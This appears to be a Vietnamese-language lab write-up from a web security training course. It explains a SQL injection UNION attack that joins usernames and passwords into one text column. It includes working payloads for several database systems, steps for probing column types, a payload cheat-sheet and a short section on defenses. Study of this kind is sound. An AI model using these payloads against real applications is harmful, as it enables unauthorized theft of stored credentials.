# Lab 6 — SQL Injection UNION Attack, Retrieving Multiple Values in a Single Column

## Mục tiêu
Giống Lab 5 (đọc username/password từ bảng `users`), nhưng lần này câu SELECT gốc **chỉ có 1 cột nhận kiểu text** trong tổng số 2 cột — buộc phải **nhét cả 2 giá trị (username + password) vào chung 1 vị trí cột** bằng kỹ thuật nối chuỗi (concatenation).

---

## 1. Vấn đề mới phát sinh — khác biệt cốt lõi so với Lab 5

Ở Lab 5, cả 2 cột của câu SELECT gốc đều nhận text → có thể đặt `username` vào cột 1, `password` vào cột 2, mỗi giá trị 1 vị trí riêng.

**Ở lab này:** Bước dò kiểu dữ liệu (kỹ thuật Lab 4) cho kết quả:
```sql
' UNION SELECT NULL,'abc'--
```
✅ Chỉ **cột 2** chấp nhận text — **cột 1 không nhận text** (là kiểu số hoặc kiểu khác không tương thích).

→ Vấn đề: cần đọc **2 giá trị** (username, password) nhưng chỉ có **1 vị trí cột khả dụng** để đặt dữ liệu text. Không thể làm như Lab 5 (mỗi giá trị 1 cột) vì cột 1 sẽ gây lỗi convert nếu đặt text vào.

---

## 2. Giải pháp — nối chuỗi (string concatenation) để gộp 2 giá trị vào 1 cột

**Payload:**
```sql
' UNION SELECT NULL, username||'~'||password FROM users--
```

**Bóc tách:**
| Phần | Vai trò |
|---|---|
| `NULL` (cột 1) | Giữ đúng số cột (2), không đặt dữ liệu gì vì cột này không nhận text |
| `username||'~'||password` (cột 2) | Nối 3 phần thành 1 chuỗi duy nhất: giá trị `username`, ký tự phân cách `~`, giá trị `password` |
| `\|\|` | Toán tử **string concatenation** — cú pháp của Oracle và PostgreSQL |

**Kết quả trả về (mỗi dòng là 1 user), ví dụ:**
```
administrator~6z0hg4lhrx8msdwoehqb
wiener~peter
```

**Vì sao cần ký tự phân cách (`~`) chứ không nối trực tiếp `username || password`:**
Nếu nối trực tiếp không có gì ngăn cách, kết quả sẽ ra 1 chuỗi liền `administrator6z0hg4lhrx8msdwoehqb` — **không thể xác định ranh giới** giữa phần username kết thúc và password bắt đầu (đặc biệt nguy hiểm nếu độ dài username thay đổi giữa các user). Dùng 1 ký tự hiếm gặp trong username/password thật (`~`, `:`, `|`...) làm delimiter giúp tách lại chính xác 2 giá trị bằng mắt thường khi đọc response.

---

## 3. Toán tử nối chuỗi khác nhau tùy DBMS — điểm cần nhớ khi đổi DBMS

| DBMS | Toán tử nối chuỗi |
|---|---|
| **Oracle** | `\|\|` |
| **PostgreSQL** | `\|\|` |
| **MySQL** | `CONCAT(a, b, c)` — **không hỗ trợ `\|\|`** theo mặc định (trừ khi bật chế độ `PIPES_AS_CONCAT`) |
| **Microsoft SQL Server** | `+` (VD `username + '~' + password`) |

→ Payload `username||'~'||password` **chỉ đúng cho Oracle/PostgreSQL**. Nếu DBMS là MySQL, phải đổi thành:
```sql
' UNION SELECT NULL, CONCAT(username,'~',password) FROM users--
```
Nếu là MSSQL:
```sql
' UNION SELECT NULL, username+'~'+password FROM users--
```

Đây chính là dấu hiệu fingerprint DBMS: nếu `||` chạy không lỗi → khả năng cao là Oracle/PostgreSQL; nếu lỗi cú pháp → thử `CONCAT()` (MySQL) hoặc `+` (MSSQL).

---

## 4. Quy trình khai thác đầy đủ (3 bước)

### Bước 1 — Xác định số cột và kiểu dữ liệu từng cột

```sql
' UNION SELECT NULL,NULL--
```
✅ Không lỗi → 2 cột.

```sql
' UNION SELECT NULL,'abc'--
```
✅ Không lỗi → cột 2 nhận text.
```sql
' UNION SELECT 'abc',NULL--
```
❌ Lỗi convert kiểu → cột 1 **không** nhận text — đây là điều kiện buộc phải dùng kỹ thuật gộp cột ở Bước 2.

### Bước 2 — Gộp 2 giá trị cần đọc vào đúng 1 cột nhận text

```sql
' UNION SELECT NULL, username||'~'||password FROM users--
```

### Bước 3 — Tách lại kết quả và đăng nhập

Đọc response, tìm dòng chứa `administrator~<password>`, tách theo dấu `~` để lấy password, đăng nhập.

→ Lab chuyển "Not solved" → **"Solved"**.

---

## 5. Bug/lỗi thường gặp

| Lỗi gặp phải | Nguyên nhân | Cách sửa |
|---|---|---|
| Lỗi cú pháp khi dùng `\|\|` | DBMS thực chất là MySQL, không hỗ trợ `\|\|` mặc định | Đổi sang `CONCAT(username,'~',password)` |
| Kết quả dính liền không tách được username/password | Quên thêm ký tự phân cách (`~`) giữa 2 giá trị | Luôn chèn 1 ký tự delimiter cố định giữa các giá trị khi gộp cột |
| Nhầm ký tự phân cách trùng với ký tự có thể xuất hiện trong password thật | Dùng dấu phân cách phổ biến (VD dấu cách, dấu `-`) dễ trùng với nội dung thật | Ưu tiên ký tự hiếm gặp như `~`, hoặc chuỗi đặc biệt dài hơn như `||` (dấu 2 gạch) nếu cần chắc chắn tuyệt đối |
| Vẫn lỗi convert dù đã chuyển value cột 1 về `NULL` | Đặt nhầm vị trí — gộp chuỗi vào cột 1 (không nhận text) thay vì cột 2 | Đối chiếu lại đúng thứ tự cột đã xác định ở Bước 1 |

---

## 6. So sánh trực tiếp Lab 5 vs Lab 6 — cùng mục tiêu, khác điều kiện ràng buộc

| | Lab 5 | Lab 6 (lab này) |
|---|---|---|
| Số cột nhận text | Cả 2 cột | Chỉ 1 cột |
| Cách đặt username/password | Mỗi giá trị 1 cột riêng | Gộp cả 2 vào chung 1 cột bằng `\|\|` |
| Cần ký tự phân cách? | Không cần | **Bắt buộc** |
| Độ phức tạp payload | Đơn giản hơn | Phức tạp hơn 1 bước |

→ Bài học cốt lõi: **số cột nhận text quyết định chiến lược đặt dữ liệu** — không phải lúc nào cũng có đủ cột để mỗi giá trị 1 vị trí riêng, kỹ thuật nối chuỗi là cách xử lý tổng quát khi bị giới hạn số cột khả dụng.

---

## 7. Cách phòng chống

**Gốc rễ — Parameterized query:** loại bỏ khả năng `category` bị hiểu thành cú pháp `UNION SELECT` kèm toán tử nối chuỗi — bất kể kỹ thuật gộp cột nào được dùng, input vẫn chỉ là dữ liệu thuần.

**Bổ sung (defense in depth):** giống các lab UNION khác — least privilege DB account, hash password. Không có biện pháp riêng nào chặn được cụ thể kỹ thuật "nối chuỗi trong UNION" mà không chặn luôn cả UNION attack nói chung.

---

## 8. Câu hỏi tự kiểm tra

1. Vì sao số cột nhận kiểu text lại quyết định việc có cần dùng kỹ thuật nối chuỗi hay không?
2. Vì sao cần 1 ký tự phân cách cố định giữa các giá trị khi gộp chung 1 cột, thay vì nối trực tiếp không có gì ở giữa?
3. Nếu chỉ có **đúng 1 cột duy nhất** trong toàn bộ câu SELECT gốc (không phải 2 cột như lab này), kỹ thuật nối chuỗi có còn áp dụng được để đọc nhiều bảng/nhiều giá trị cùng lúc không?
4. Vì sao việc DBMS dùng `\|\|` hay `CONCAT()` hay `+` lại là 1 tín hiệu fingerprint hữu ích tương tự như comment syntax (`--` vs `#`) đã học ở Lab 8?

---

## 9. Payload cuối cùng (cheat-sheet)

```sql
-- Bước 1: xác định số cột + kiểu dữ liệu từng cột
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,'abc'--      -- cột 2 nhận text
' UNION SELECT 'abc',NULL--      -- cột 1 KHÔNG nhận text (lỗi)

-- Bước 2: gộp username + password vào đúng 1 cột nhận text (Oracle/PostgreSQL)
' UNION SELECT NULL, username||'~'||password FROM users--

-- Biến thể MySQL
' UNION SELECT NULL, CONCAT(username,'~',password) FROM users--

-- Biến thể MSSQL
' UNION SELECT NULL, username+'~'+password FROM users--
```

**Kết quả:** Response hiển thị các dòng dạng `username~password` → tách lấy password của `administrator` → đăng nhập → lab solved.
